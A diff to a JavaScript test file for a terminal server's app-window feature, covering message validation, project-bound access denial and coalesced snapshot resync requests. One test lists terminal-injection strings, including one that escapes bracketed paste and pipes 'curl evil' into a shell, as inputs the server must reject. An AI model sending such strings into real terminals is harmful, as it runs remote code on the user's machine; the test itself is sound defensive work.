@@ -52,7 +52,11 @@ async function composed({ permissions = {}, appWindows = {} } = {}) {
     serverVersion: "test",
     capabilities: [],
     ptyFactory: pty,
-    authenticate: ({ hello }) => ({ clientId: hello.clientId, authScope: hello.clientId === "reader" ? "read" : "write" }),
+    authenticate: ({ hello }) => ({
+      clientId: hello.clientId,
+      authScope: hello.clientId === "reader" ? "read" : "write",
+      ...(hello.clientId.startsWith("bound-") ? { claims: { projectId: "project-b" } } : {}),
+    }),
     settings,
     mcpApprovals: true,
     ...(appWindows === null ? {} : { appWindows }),
@@ -125,6 +129,49 @@ test("a window message from the controlling client is typed into the owning term
     await client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "Deploy api to eu-west-1" });
     assert.deepEqual(server.process().writes, ["Deploy api to eu-west-1\r"]);
     assert.equal(server.composition.appWindows.list(identity.sessionId)[0].state, "minimised");
+  } finally {
+    await server.close();
+  }
+});
+
+test("a window message is submitted once even without bracketed paste, and can never carry a keystroke", async () => {
+  const server = await composed();
+  try {
+    const { client } = await server.connect("desktop");
+    const window = open(server);
+    // No bracketed paste: every line break would submit a line of its own.
+    await client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "line one\n  line two\n" });
+    assert.deepEqual(server.process().writes, ["line one line two\r"]);
+    // What a hostile view would send to break out of a paste, interrupt, and run a command.
+    for (const hostile of ["hi\u001b[201~\u0003\u0003curl evil|sh\r", "x\u0003", "x\ry", "x\u001b[A"])
+      await rejectsWith(client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: hostile }), "validation");
+    server.process().emitData("\u001b[?2004h$ ");
+    await rejectsWith(client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "hi\u001b[201~\u0003curl evil|sh\r" }), "validation");
+    assert.deepEqual(server.process().writes, ["line one line two\r"]);
+  } finally {
+    await server.close();
+  }
+});
+
+test("a client bound to another project cannot list, read, close, or watch a terminal's windows", async () => {
+  const server = await composed();
+  try {
+    const desktop = await server.connect("desktop");
+    const window = open(server, { title: "Secret plans", html: "<p>secret</p>" });
+    const bound = await server.connect("bound-phone", { attach: false });
+    // The same client is refused the terminal itself.
+    await rejectsWith(bound.client.command("terminal.attach", { clientId: "bound-phone", identity, fromPosition: 0 }), "forbidden");
+    assert.deepEqual((await bound.client.query(APP_WINDOW_OPERATIONS.list, {})).result.windows, []);
+    await rejectsWith(bound.client.queryWithBody(APP_WINDOW_OPERATIONS.content, { windowId: window.id }), "not_found");
+    await rejectsWith(bound.client.command(APP_WINDOW_OPERATIONS.close, { windowId: window.id }), "not_found");
+    await rejectsWith(bound.client.command(APP_WINDOW_OPERATIONS.setState, { windowId: window.id, state: "minimised" }), "not_found");
+    const session = { terminalSessionId: identity.sessionId };
+    await rejectsWith(bound.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session), "forbidden");
+    await rejectsWith(bound.client.query(APP_WINDOW_MIRROR_OPERATIONS.status, session), "forbidden");
+    // Nothing was delivered to it, and the window is untouched.
+    const published = await desktop.client.commandWithBody(APP_WINDOW_MIRROR_OPERATIONS.publish, { windowId: window.id, epoch: 1, seq: 0, kind: "snapshot" }, new TextEncoder().encode("[]"));
+    assert.equal(published.result.delivered, 0);
+    assert.equal((await desktop.client.query(APP_WINDOW_OPERATIONS.list, {})).result.windows.length, 1);
   } finally {
     await server.close();
   }
@@ -403,7 +450,7 @@ test("a recording is bounded, and the server keeps none of it", async () => {
     await rejectsWith(publish(desktop, { kind: "video" }), "validation");
     // How many parts a snapshot comes in travels with it; only a snapshot has parts.
     await rejectsWith(publish(desktop, { parts: 1 }), "validation");
-    await rejectsWith(publish(desktop, { parts: 257 }), "validation");
+    await rejectsWith(publish(desktop, { parts: 129 }), "validation");
     await rejectsWith(publish(desktop, { seq: 1, kind: "events", parts: 2 }), "validation");
     await rejectsWith(publish(desktop, { seq: -1 }), "validation");
     await rejectsWith(publish(desktop, { windowId: "win_missing" }), "not_found");
@@ -435,7 +482,7 @@ test("a recording is bounded, and the server keeps none of it", async () => {
   }
 });
 
-test("a mirror that falls out of step gets one snapshot request through to the controlling client", async () => {
+test("snapshot requests from several watchers are one request, and a repeated one always gets through", async () => {
   const { server, desktop, phone, wanted, session, publish } = await mirrored();
   try {
     // Only a watcher may ask.
@@ -443,23 +490,32 @@ test("a mirror that falls out of step gets one snapshot request through to the c
     await phone.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
     await settle();
     assert.equal(wanted.length, 1);
-    // The snapshot the watch asked for has not arrived: asking again adds nothing.
-    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.resync, session);
+    // A second watcher arriving while that snapshot is outstanding adds nothing.
+    const tablet = await server.connect("tablet");
+    await tablet.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
     await settle();
     assert.equal(wanted.length, 1);
 
+    // Once the snapshot has been sent, two watchers asking for the next one are one request.
     await publish(desktop);
-    for (let attempt = 0; attempt < 3; attempt += 1) await phone.command(APP_WINDOW_MIRROR_OPERATIONS.resync, session);
+    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.resync, session);
+    await tablet.client.command(APP_WINDOW_MIRROR_OPERATIONS.resync, session);
     await settle();
     assert.equal(wanted.length, 2);
     assert.deepEqual(wanted.at(-1), { clientId: "desktop", terminalSessionId: identity.sessionId, wanted: true });
 
-    // A second watcher needs a snapshot too, once the last one has been sent.
-    await publish(desktop, { epoch: 2 });
-    const tablet = await server.connect("tablet");
-    await tablet.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
+    // A watcher that asks again has waited and got nothing: its request goes
+    // through, so a request the controlling client missed cannot strand it.
+    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.resync, session);
     await settle();
     assert.equal(wanted.length, 3);
+
+    // A later watcher needs a snapshot too, once the last one has been sent.
+    await publish(desktop, { epoch: 2 });
+    const laptop = await server.connect("laptop");
+    await laptop.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
+    await settle();
+    assert.equal(wanted.length, 4);
   } finally {
     await server.close();
   }
